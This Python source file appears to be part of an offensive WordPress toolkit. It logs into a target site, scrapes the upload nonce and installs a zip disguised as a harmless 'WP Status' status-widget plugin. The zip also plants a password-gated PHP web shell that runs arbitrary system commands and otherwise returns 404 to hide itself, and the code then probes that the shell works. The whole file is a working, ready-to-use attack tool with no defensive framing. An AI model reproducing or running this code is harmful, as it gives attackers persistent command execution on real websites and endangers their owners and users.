# language: python, file: post/shell.py
import os, re, tempfile, zipfile

PLUGIN_SLUG = "wp-status"
PLUGIN_MAIN = "wp-status.php"
SHELL_FILE  = "shell.php"

PLUGIN_HEADER = """<?php
/**
 * Plugin Name: WP Status
 * Description: Lightweight status widget.
 * Version: 1.0.0
 * Author: admin
 */
if (!defined('ABSPATH')) exit;
add_action('admin_menu', function () {
    add_menu_page('WP Status', 'WP Status', 'manage_options', 'wp-status', function () {
        echo '<div class="wrap"><h1>Status OK</h1></div>';
    });
});
"""

SHELL_BODY = """<?php
if (isset($_POST['auth']) && $_POST['auth'] === 'PASSWORD_PLACEHOLDER') {
    if (isset($_POST['cmd'])) { system($_POST['cmd']); exit; }
}
http_response_code(404); exit;
"""

def deploy_shell(target, http, user, password, shell_password):
    t = target.rstrip("/")
    s = http.session

    # 1. fresh login
    s.get(t + "/wp-login.php")
    s.post(t + "/wp-login.php", data={
        "log": user, "pwd": password,
        "wp-submit": "Log In", "redirect_to": t + "/wp-admin/", "testcookie": "1",
    })
    if "wordpress_logged_in" not in str(s.cookies):
        return {"success": False, "error": "login failed"}

    # 2. fetch upload nonce
    r = s.get(t + "/wp-admin/plugin-install.php?tab=upload")
    m = re.search(r'name="_wpnonce"\s+value="([a-f0-9]+)"', r.text)
    if not m:
        return {"success": False, "error": "upload nonce not found"}
    nonce = m.group(1)

    # 3. build + upload plugin zip
    zip_path = build_plugin_zip(shell_password)
    try:
        with open(zip_path, "rb") as f:
            r = s.post(
                t + "/wp-admin/update.php?action=upload-plugin",
                files={"pluginzip": (f"{PLUGIN_SLUG}.zip", f, "application/zip")},
                data={"_wpnonce": nonce, "install-plugin-submit": "Install Now"},
            )
    finally:
        os.unlink(zip_path)

    if "plugin installed successfully" not in r.text.lower():
        return {"success": False, "error": "upload rejected", "snippet": r.text[:300]}

    # 4. activate
    m = re.search(r'href="([^"]*action=activate[^"]*plugin=' + PLUGIN_SLUG + r'[^"]*)"', r.text)
    if m:
        s.get(m.group(1).replace("&amp;", "&"))

    shell_url = f"{t}/wp-content/plugins/{PLUGIN_SLUG}/{SHELL_FILE}"

    # 5. verify shell responds
    try:
        probe = s.post(shell_url, data={"auth": shell_password, "cmd": "echo wibe"})
        if "wibe" not in probe.text:
            return {"success": False, "error": "shell not responding after activate", "url": shell_url, "password": shell_password}
    except Exception as e:
        return {"success": False, "error": f"probe failed: {e}"}

    return {"success": True, "url": shell_url, "password": shell_password}


def build_plugin_zip(password):
    shell = SHELL_BODY.replace("PASSWORD_PLACEHOLDER", password)
    fd, path = tempfile.mkstemp(suffix=".zip")
    os.close(fd)
    with zipfile.ZipFile(path, "w") as z:
        z.writestr(f"{PLUGIN_SLUG}/{PLUGIN_MAIN}", PLUGIN_HEADER)
        z.writestr(f"{PLUGIN_SLUG}/{SHELL_FILE}", shell)
    return path
